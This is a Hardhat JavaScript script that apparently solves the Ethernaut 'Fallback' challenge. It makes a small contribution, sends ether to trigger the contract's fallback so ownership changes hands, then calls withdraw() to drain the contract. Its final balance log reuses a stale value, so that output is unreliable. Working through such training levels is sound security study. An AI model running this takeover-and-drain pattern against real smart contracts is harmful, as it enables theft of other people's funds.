const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0x5751542a9ba5C276D2C24A3A3E600f75c78eA489"
  );
  const Contract = await hre.ethers.getContractFactory("Fallback");
  const contractInstance = await Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  await contractInstance.contribute({
    value: hre.ethers.utils.parseEther("0.0009"),
  });

  console.log("contribution", await contractInstance.getContribution());

  console.log("owner before", await contractInstance.owner());

  const transactionHash = await owner.sendTransaction({
    to: contractAddress,
    value: ethers.utils.parseEther("0.0001"),
  });
  await transactionHash.wait();

  console.log("owner after", await contractInstance.owner());

  const contractBalance = await hre.ethers.provider.getBalance(contractAddress);

  console.log("contract balance before", contractBalance.toString());

  await contractInstance.connect(owner).withdraw();

  console.log("contract balance afetr", contractBalance.toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
